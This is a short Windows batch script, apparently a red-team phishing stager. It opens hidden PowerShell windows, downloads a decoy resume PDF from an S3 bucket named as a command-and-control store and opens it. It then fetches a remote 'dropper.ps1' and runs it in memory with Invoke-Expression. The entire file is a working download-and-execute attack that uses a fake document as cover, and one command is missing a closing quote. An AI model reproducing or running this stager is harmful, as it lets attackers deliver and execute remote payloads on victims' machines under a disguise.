@echo off
powershell.exe -windowstyle hidden -command "Invoke-WebRequest -Uri 'https://redteamc2bucket.s3.ap-south-1.amazonaws.com/Resume-Kanan-Shah.pdf'-Outfile 'C:\\Windows\\Temp\\Resume-Kanan-Shah.pdf'"
powershell.exe -windowstyle hidden -command "Start-Process ((Resolve-Path 'C:\\Windows\\Temp\\Resume-Kanan-Shah.pdf').Path)
powershell.exe -windowstyle hidden -command "(new-object system.net.webclient).downloadstring('https://redteamc2bucket.s3.ap-south-1.amazonaws.com/dropper.ps1') | IEX"